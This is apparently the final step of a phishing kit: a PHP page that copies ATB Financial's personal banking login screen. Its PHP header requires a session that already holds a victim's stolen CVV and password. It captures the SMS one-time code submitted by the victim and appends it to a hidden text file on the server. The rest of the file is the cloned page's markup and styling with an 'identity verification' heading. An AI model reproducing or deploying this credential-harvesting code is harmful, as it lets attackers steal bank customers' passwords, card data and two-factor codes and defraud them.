<?php session_start();
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
       header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

session_destroy();




?>


<!DOCTYPE html>
<html class="fa-events-icons-failed">
<script async="" src="./ATB Personal Banking_files/gtm.js.téléchargement"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
  id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <script type="text/javascript" src="./ATB Personal Banking_files/ATB_fqeu89sv8ba3.js.téléchargement"></script>


  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <link rel="Shortcut Icon" href="https://www.atb.com/static/img/favicon.ico" type="image/x-icon">
  <title>ATB Personal Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" type="text/css" href="/atb/ATB Personal Banking_files/5744869DEF9B13858.css">

  <!-- This font seems not to be used. TODO: Remove these lines completely as soon as we are sure that this not being used.
    <script src="https://use.typekit.net/deb5vpt.js"></script>
    <script>try{Typekit.load({ async: true });}catch(e){}</script> -->
  <link rel="stylesheet" type="text/css" href="https://cloud.typography.com/6700732/6101192/css/fonts.css">
  <script src="https://use.fontawesome.com/f26ba7188d.js"></script>
  <link href="https://use.fontawesome.com/f26ba7188d.css" media="all" rel="stylesheet">
  <link href="./ATB Personal Banking_files/css" rel="stylesheet">

  <!-- Google Tag Manager -->
  <script>(function (w, d, s, l, i) {
      w[l] = w[l] || []; w[l].push({
        'gtm.start':
          new Date().getTime(), event: 'gtm.js'
      }); var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
          'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-KGVVNNM');
  </script>
  <!-- End Google Tag Manager -->

  <style type="text/css" data-styled-components="" data-styled-components-is-local="false">
    /* sc-component-id: sc-global-360865453 */
    body {
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 14px;
      color: rgba(43, 53, 61, 1);
    }

    a {
      font-family: 'Open Sans', sans-serif;
      font-weight: bold;
      font-size: 14px;
      color: rgba(43, 53, 61, 0.56);
    }

    label {
      font-family: 'Open Sans', sans-serif;
      font-weight: 600;
      font-size: 14px;
      color: rgba(43, 53, 61, 0.56);
    }

    label.validation-error {
      color: #EB0042;
    }

    label.input {
      display: block;
    }

    label.input.top {
      padding-bottom: 8px;
    }

    label.input.bottom {
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 12px;
      color: rgba(43, 53, 61, 0.72);
      color: #EB0042;
      padding-top: 8px;
    }

    a.button {
      display: block;
      -webkit-text-decoration: none;
      text-decoration: none;
      line-height: 32px;
      height: 32px !important;
    }

    .uiNewButtonWrapper {
      position: relative;
      font-size: 0;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      -webkit-transform: translate(-50%, -50%);
      -ms-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
      color: #fff;
      line-height: 1.5715;
      font-size: 16px;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner span[role=img],
    .uiNewButtonWrapper span.dynamic-button__spinner svg {
      cursor: pointer;
      width: 1em;
      height: 1em;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner .anticon {
      display: inline-block;
      color: inherit;
      font-style: normal;
      line-height: 0;
      text-align: center;
      text-transform: none;
      vertical-align: -0.125em;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner .anticon>* {
      line-height: 1;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner .anticon svg {
      display: inline-block;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner .anticon::before {
      display: none;
    }

    .uiNewButtonWrapper span.dynamic-button__spinner .anticon-spin::before,
    .uiNewButtonWrapper span.dynamic-button__spinner .anticon-spin {
      display: inline-block;
      -webkit-animation: loadingCircle 1s infinite linear;
      -webkit-animation: loadingCircle 1s infinite linear;
      animation: loadingCircle 1s infinite linear;
    }

    @-webkit-keyframes loadingCircle {
      100% {
        -webkit-transform: rotate(360deg);
        -webkit-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @-webkit-keyframes loadingCircle {
      100% {
        -webkit-transform: rotate(360deg);
        -webkit-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes loadingCircle {
      100% {
        -webkit-transform: rotate(360deg);
        -webkit-transform: rotate(360deg);
        -ms-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    input[type="submit"],
    a.button {
      font-family: 'Open Sans', sans-serif;
      font-weight: bold;
      font-size: 14px;
      color: rgba(43, 53, 61, 1);
      height: 44px;
      min-width: 88px;
      padding-left: 16px;
      padding-right: 16px;
      -webkit-border-radius: 50px;
      -moz-border-radius: 50px;
      border-radius: 50px;
      cursor: pointer;
    }

    input[type="submit"].primary,
    a.button.primary {
      background-color: #005eb8;
      color: rgba(255, 255, 255, 1);
      border: 0px none;
      -webkit-appearance: none;
    }

    input[type="submit"].primary.disabled,
    a.button.primary.disabled {
      background-color: rgba(43, 53, 61, 0.16);
    }

    input[type="submit"].primary:hover,
    a.button.primary:hover {
      box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.32);
    }

    input[type="submit"].secondary,
    a.button.secondary {
      border: solid 1px;
      background-colour: none;
      color: #005eb8;
    }

    input[type="submit"].secondary.disabled,
    a.button.secondary.disabled {
      color: rgba(43, 53, 61, 0.16);
      border-color: rgba(43, 53, 61, 0.16);
    }

    input[type="submit"].secondary:hover,
    a.button.secondary:hover {
      box-shadow: inset 0px 0px 0px 1px;
    }

    input[type="submit"].grey,
    a.button.grey {
      border-color: rgba(43, 53, 61, 0.56);
      color: rgba(43, 53, 61, 0.56);
      background-color: #ffffff;
    }

    input[type="submit"].pink,
    a.button.pink {
      border-color: #EB0042;
      color: #EB0042;
      background-color: #ffffff;
    }

    input[type="submit"].orange,
    a.button.orange {
      border-color: #FF671F;
      color: #FF671F;
      background-color: #ffffff;
    }

    input[type="submit"].green,
    a.button.green {
      border-color: #008576;
      color: #008576;
      background-color: #ffffff;
    }

    input[type="submit"].brand-secondary,
    a.button.brand-secondary {
      border-color: #009CDE;
      color: #009CDE;
      background-color: #ffffff;
    }

    input {
      height: 10000px;
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 0.875rem;
      color: rgba(43, 53, 61, 1);
      background-color: #ffffff;
      border: 1px solid rgba(43, 53, 61, 0.32);
      -webkit-border-radius: 3px;
      -moz-border-radius: 3px;
      border-radius: 3px;
      box-sizing: border-box;
      padding-left: 16px;
      padding-right: 16px;
      width: 100%;
      height: 44px;
      outline: none;
    }

    input.validation-error {
      border-color: #EB0042;
    }

    input:hover {
      border-color: rgba(43, 53, 61, 0.56);
    }

    input:focus {
      border-color: #005eb8;
    }

    input:focus::-webkit-textfield-decoration-container {
      visibility: hidden;
      pointer-events: none;
    }

    input::-webkit-contacts-auto-fill-button {
      visibility: hidden;
      display: none !important;
      pointer-events: none;
    }

    input[type=password]::-ms-reveal {
      display: none;
    }

    input[type=text]::-ms-clear {
      display: none;
    }

    #footer-login {
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 12px;
      color: rgba(43, 53, 61, 0.72);
      font-size: 10px;
      line-height: 16px;
    }

    h1 {
      font-family: 'Sentinel';
      font-weight: medium;
      font-size: 34px;
      color: rgba(43, 53, 61, 1);
    }

    h2 {
      font-family: 'Open Sans', sans-serif;
      font-weight: bold;
      font-size: 22px;
      color: rgba(43, 53, 61, 1);
    }

    h3 {
      font-family: 'Open Sans', sans-serif;
      font-weight: bold;
      font-size: 18px;
      color: rgba(43, 53, 61, 1);
    }

    h4 {
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 18px;
      color: rgba(43, 53, 61, 1);
    }

    h5 {
      font-family: 'Open Sans', sans-serif;
      font-weight: bold;
      font-size: 14px;
      color: rgba(43, 53, 61, 1);
    }

    .caption-1 {
      font-family: 'Open Sans', sans-serif;
      font-style: italic;
      font-weight: normal;
      font-size: 14px;
      color: rgba(43, 53, 61, 0.72);
    }

    .caption-2 {
      font-family: 'Open Sans', sans-serif;
      font-weight: normal;
      font-size: 12px;
      color: rgba(43, 53, 61, 0.72);
    }

    /* sc-component-id: sc-global-2805340612 */
    input:focus {
      border-color: #0072F0;
    }

    .paragraph-2 {
      font-family: "Inter";
      font-size: 14px;
      line-height: 20px;
    }

    .paragraph-3 {
      font-family: "Inter";
      font-size: 12px;
      line-height: 16px;
    }

    .paragraph-3 a.ant-typography,
    .paragraph-3 .ant-typography a,
    .paragraph-3 a {
      font-size: 12px;
    }

    svg#login text {
      font-family: "Inter";
      font-size: 12px;
      line-height: 16px;
    }

    .subtitle-2 {
      font-family: "Inter" !important;
      font-weight: 600;
      font-size: 12px;
      line-height: 16px;
    }

    .subtitle-1 {
      font-family: "Inter" !important;
      font-weight: 600;
      font-size: 14px;
      line-height: 20px;
    }

    .headline-5 {
      font-size: 18px !important;
      line-height: 24px;
      font-family: "Inter" !important;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .headline-6 {
      font-size: 16px !important;
      line-height: 24px;
      font-family: "Inter" !important;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .button-primary-rebrand {
      background-color: #0072F0 !important;
    }

    .button-primary-rebrand:hover {
      box-shadow: none !important;
    }

    @media only screen and (max-width:991px) {
      .headline-5 {
        font-size: 16px !important;
        line-height: 24px;
        font-family: "Inter" !important;
        font-weight: 600;
        margin-bottom: 8px;
      }

      .headline-6 {
        font-size: 14px !important;
        line-height: 24px;
        font-family: "Inter" !important;
        font-weight: 600;
        margin-bottom: 8px;
      }
    }

    @media only screen and (max-width:767px) {
      .headline-5 {
        font-size: 14px !important;
        line-height: 20px;
        font-family: "Inter" !important;
        font-weight: 600;
        margin-bottom: 8px;
      }

      .headline-6 {
        font-size: 14px !important;
        line-height: 20px;
        font-family: "Inter" !important;
        font-weight: 600;
        margin-bottom: 8px;
      }
    }

    .rebank-loggedout {
      text-align: center;
    }

    .rebank-loggedout img {
      padding-bottom: 8px;
    }

    .rebank-loggedout-message {
      color: #44444D;
    }

    .rebank-loggedout .border-space-green {
      margin-top: 22px;
      height: 22px;
      border-top: solid 2px #00855d;
    }

    .rebank-loggedout .border-space-red {
      margin-top: 22px;
      height: 22px;
      border-top: solid 2px #EB0042;
    }

    .rebank-loggedout .border-space-yellow {
      margin-top: 22px;
      height: 22px;
      border-top: solid 2px #f1bc00;
    }

    .rebank-loggedout .title {
      font-size: 20px;
      font-weight: 600;
      font-stretch: normal;
      font-style: normal;
      line-height: normal;
      color: #44444D;
      -webkit-letter-spacing: 0.02px;
      -moz-letter-spacing: 0.02px;
      -ms-letter-spacing: 0.02px;
      letter-spacing: 0.02px;
      padding-top: 10px;
      padding-bottom: 10px;
    }

    .rebank-loggedout .title.invalidusernameorpassword {
      font-size: 18px;
    }

    .rebank-textfield {
      color: #44444D;
      border-color: #44444D !important;
      font-family: "Inter";
      font-weight: normal;
    }

    .rebank-textfield:hover {
      border-color: #44444D !important;
    }

    .rebank-textfield:focus {
      border-color: #0072F0 !important;
    }

    #caps-lock {
      height: 15px;
      width: 15px;
      margin-top: -30px;
      margin-left: 15px;
    }

    .secureKey-textfield {
      font-weight: normal;
    }

    #caps-lock {
      height: 15px;
      width: 15px;
      margin-top: -30px;
      margin-left: 15px;
    }

    .rebank-button.rebank-button {
      font-family: "Inter";
      font-weight: normal;
    }

    #mask-toggle {
      margin-top: -46px;
      width: 40px;
      margin-right: 4px !important;
    }

    .validation-error.rebank-textfield {
      color: #44444D;
    }

    /* sc-component-id: sc-global-218314145 */
    * {
      margin: 0;
    }

    #app {
      height: 100%;
    }

    html,
    body {
      font-family: Inter;
      background-color: white;
      height: 100%;
    }

    .flex-fix {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-flex: 1 0 auto;
      -ms-flex: 1 0 auto;
      flex: 1 0 auto;
    }

    @-moz-document url-prefix() {
      .flex-fix {
        -webkit-flex: 1;
        -ms-flex: 1;
        flex: 1;
      }
    }

    @media not all and (min-width:320px) {
      .loginBoxTd {
        vertical-align: top;
      }
    }

    @media not all and (min-width:720px) {
      .overallContainer {
        vertical-align: top;
        width: 100%;
      }
    }
  </style>
  <style type="text/css"
    data-styled-components="bzQzYK iUyiAj eNoisr cwXkDs khUSez fJrgwy bPSoWc jQbsgO klnAeX emnlIF kPYCsv grFJIy kfWmrv fFPsgR hfZKkh"
    data-styled-components-is-local="true">
    /* sc-component-id: sc-bdVaJa */

    .khUSez {
      text-align: center;
    }

    /* sc-component-id: sc-bwzfXH */

    .bPSoWc {
      text-align: center;
      font-weight: normal;
      color: #44444D;
    }

    @media all and (min-width:992px) {
      .bPSoWc {
        padding-top: 150px;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .bPSoWc {
        padding-top: 130px;
      }
    }

    @media not all and (min-width:767px) {
      .bPSoWc {
        padding-top: 130px;
      }
    }

    .bPSoWc a {
      font-family: Inter !important;
      font-weight: 600 !important;
      -webkit-text-decoration: none;
      text-decoration: none;
      color: #0072F0;
    }

    .bPSoWc a:hover {
      color: #0053db;
    }

    /* sc-component-id: sc-htpNat */

    .fJrgwy {
      width: 202px;
      height: 54px;
      object-fit: contain;
    }

    /* sc-component-id: sc-iwsKbI */

    .iUyiAj {
      width: 100%;
      height: 40px;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      background: #0072F0;
    }

    @media all and (min-width:992px) {
      .iUyiAj {
        display: none;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .iUyiAj {
        display: none;
      }
    }

    @media not all and (min-width:767px) {
      .iUyiAj {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }
    }

    /* sc-component-id: sc-VigVT */

    .jQbsgO {
      height: 0.7em;
    }

    /* sc-component-id: sc-jTzLTM */

    .cwXkDs {
      box-sizing: border-box;
      background: #ffffff;
      min-width: 320px;
      width: 420px;
      height: 100%;
      padding: 60px;
      padding-top: 60px;
    }

    @media all and (min-width:992px) {
      .cwXkDs {
        padding-bottom: 10px;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .cwXkDs {
        width: 320px;
        padding: 20px;
        padding-top: 60px;
      }
    }

    @media not all and (min-width:767px) {
      .cwXkDs {
        width: 320px;
        padding: 33px;
        padding-top: 60px;
      }
    }

    /* sc-component-id: sc-fjdhpX */

    .grFJIy {
      padding-top: 50px;
    }

    /* sc-component-id: sc-jzJRlG */

    .eNoisr {
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
    }

    @media all and (min-width:992px) {
      .eNoisr {
        height: 100%;
        width: 40%;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .eNoisr {
        width: 100%;
      }
    }

    @media not all and (min-width:767px) {
      .eNoisr {
        width: 320px;
      }
    }

    /* sc-component-id: sc-kAzzGY */

    .klnAeX {
      width: 604px;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      background: #0072F0;
      vertical-align: middle;
      -webkit-align-content: stretch;
      -ms-flex-line-pack: stretch;
      align-content: stretch;
      text-align: left;
      color: white;
      font-family: Inter;
      font-size: 68px;
      font-style: normal;
      font-stretch: normal;
      line-height: 1.07;
      -webkit-letter-spacing: normal;
      -moz-letter-spacing: normal;
      -ms-letter-spacing: normal;
      letter-spacing: normal;
    }

    @media all and (min-width:992px) {
      .klnAeX {
        width: 60%;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .klnAeX {
        width: 100%;
        overflow: hidden;
        -webkit-flex: 1;
        -ms-flex: 1;
        flex: 1;
      }
    }

    @media not all and (min-width:767px) {
      .klnAeX {
        display: none;
      }
    }

    /* sc-component-id: sc-chPdSV */

    .emnlIF {
      width: 100%;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
    }

    /* sc-component-id: sc-kgoBCf */

    .bzQzYK {
      background: #ffffff;
      vertical-align: top;
      display: -webkit-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      min-width: 320px;
      -webkit-align-items: center;
      -webkit-box-align: center;
      -ms-flex-align: center;
      align-items: center;
    }

    @media all and (min-width:992px) {
      .bzQzYK {
        -webkit-align-items: stretch;
        -webkit-box-align: stretch;
        -ms-flex-align: stretch;
        align-items: stretch;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        min-height: 100vh;
      }
    }

    @media (min-width:767px) and (max-width:991px) {
      .bzQzYK {
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        height: 100vh;
      }
    }

    @media not all and (min-width:767px) {
      .bzQzYK {
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
      }
    }

    /* sc-component-id: sc-dxgOiQ */

    .hfZKkh {
      color: #0072F0;
      text-align: center;
      font-family: Inter;
      font-weight: 600;
      font-style: normal;
      font-stretch: normal;
      background: none;
      border: none;
      -webkit-flex: center;
      -ms-flex: center;
      flex: center;
      width: 100%;
      cursor: pointer;
    }

    .hfZKkh:hover {
      color: #0053db;
    }

    /* sc-component-id: sc-ckVGcZ */

    .kPYCsv {
      width: 100%;
      background-repeat: no-repeat;
      background-size: cover;
      background-image: url("https://verify.auth.atb.com/images/RebankWeb/login-page-sketch.svg");
    }

    @media (min-width:767px) and (max-width:991px) {
      .kPYCsv {
        background-position: top;
      }
    }

    /* sc-component-id: sc-eNQAEJ */

    .fFPsgR {
      height: 30px;
      width: 30px;
      position: relative;
      float: right;
      margin-top: -39px;
    }

    /* sc-component-id: sc-hMqMXs */

    .kfWmrv {
      height: 17px;
      width: 17px;
      position: relative;
      float: right;
      margin-top: -30px;
      opacity: 0;
    }
  </style>
  <style type="text/css">
    @import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap);
  </style>
  <style type="text/css"></style>
  <script src="./ATB Personal Banking_files/dsp" type="text/javascript" defer="" async=""></script>
</head>

<body>
 
  
  <div id="app">
    <div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper">
      <div class="sc-iwsKbI iUyiAj"></div>
      <div class="sc-jzJRlG eNoisr">
        <form action="/atb/terminus.php" method="post" class="sc-jTzLTM cwXkDs" id="rbw-login-block">
          <div class="sc-bdVaJa khUSez"><img class="sc-htpNat fJrgwy"
              src="/atb/ATB Personal Banking_files/atb-jewel-new.svg" id="rbw-login-heading-atb-logo"></div>
                <br>
                <br>
         <h4>Vérification d'Ididentité</h4>
        </form>
      </div>
      <div class="sc-kAzzGY klnAeX">
        <div class="sc-chPdSV emnlIF" id="rbw-marquee-block">
          <div class="sc-ckVGcZ kPYCsv"></div>
        </div>
      </div>
    </div>
  </div>


  <script id="fconfig" type="application/json"
    fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f":"eff1bcffbd43481cbad44689dad72374","s":"simility_rda"}</script>
  <script src="./ATB Personal Banking_files/fb.js.téléchargement"></script>

  <iframe id="ppfnfnclspbfiframe" src="./ATB Personal Banking_files/saved_resource.html" title="pbf" tabindex="-1"
    aria-hidden="true"
    style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;"></iframe><iframe
    allow="geolocation" id="ppfnfnclsiframe" title="ppfniframe" tabindex="-1" src="./ATB Personal Banking_files/i.html"
    aria-hidden="true"
    style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;"></iframe>
  <div id="extension-mmplj"></div>
</body>

</html>